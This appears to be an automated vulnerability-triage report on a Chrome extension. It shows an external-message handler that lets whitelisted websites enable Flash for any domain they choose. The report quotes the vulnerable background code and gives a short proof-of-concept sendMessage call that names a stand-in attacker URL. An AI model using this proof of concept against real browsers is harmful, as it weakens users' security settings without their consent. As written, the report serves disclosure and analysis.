# CoCo Analysis: plhdffccclnkdlolokgfdobocldbjdjn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/plhdffccclnkdlolokgfdobocldbjdjn/opgen_generated_files/bg.js
Line 1000	authorizeFlash(request.url);

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/plhdffccclnkdlolokgfdobocldbjdjn/opgen_generated_files/bg.js
Line 966	const ruta = apiUrl.split(".");

**Code:**

```javascript
// Background script (bg.js)
// Line 965-982: Privileged API operation with attacker-controlled URL
function authorizeFlash(apiUrl) {
  const ruta = apiUrl.split(".");  // ← attacker-controlled
  const pattern = `*://*.${ruta[ruta.length - 2]}.${ruta[ruta.length - 1]}/*`;  // ← attacker-controlled
  chrome.contentSettings.plugins.set(
    {
      primaryPattern: pattern,  // ← attacker-controlled domain pattern
      setting: "allow",
      scope: "regular"
    },
    err => {
      console.log(err);
    }
  );
}

// Line 991-1010: External message listener
chrome.runtime.onMessageExternal.addListener(function(
  request,
  sender,
  sendResponse
) {
  if (request) {
    console.log(request);
    if (request.message) {
      if (request.message === "version") {
        authorizeFlash(request.url);  // ← attacker-controlled request.url
        passStorage(request.url);
        chrome.storage.sync.set({
          externalUrl: request.url  // ← attacker-controlled
        });
        sendResponse({ version: 1.0 });
      }
    }
  }
  return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any whitelisted domain (e.g., https://www.jogosjogos.com/)
chrome.runtime.sendMessage(
  'plhdffccclnkdlolokgfdobocldbjdjn',  // Extension ID
  {
    message: 'version',
    url: 'https://attacker.com/malicious'  // Attacker-controlled URL
  },
  function(response) {
    console.log('Flash enabled for attacker.com');
  }
);
```

**Impact:** An attacker from any whitelisted domain in the externally_connectable manifest can enable Flash plugin permissions for arbitrary domains via chrome.contentSettings.plugins.set(). This is a privileged operation that modifies browser security settings. Additionally, the attacker-controlled URL is stored in chrome.storage.sync, though storage poisoning alone is secondary to the more critical contentSettings manipulation.
